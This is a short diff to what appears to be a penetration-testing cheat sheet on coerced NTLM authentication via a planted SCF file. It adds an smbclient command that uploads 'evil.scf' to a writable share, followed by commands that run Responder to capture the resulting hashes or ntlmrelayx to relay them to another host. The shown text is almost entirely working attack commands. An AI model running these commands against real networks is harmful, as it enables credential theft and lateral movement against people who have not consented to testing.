@@ -24,9 +24,11 @@ Command=ToggleDesktop
 
 ```bash
 # Capture or relay the coerced authentication
+# Place the file on the writable share, then listen for the coerced auth
+smbclient //<target>/share -U user%pass -c 'put evil.scf'
 responder -I eth0
 # or relay it straight to another host
-ntlmrelayx.py -t smb://<target> -smb2support
+ntlmrelayx.py -t smb://<other-target> -smb2support
 ```
 
 ## Exploitation notes
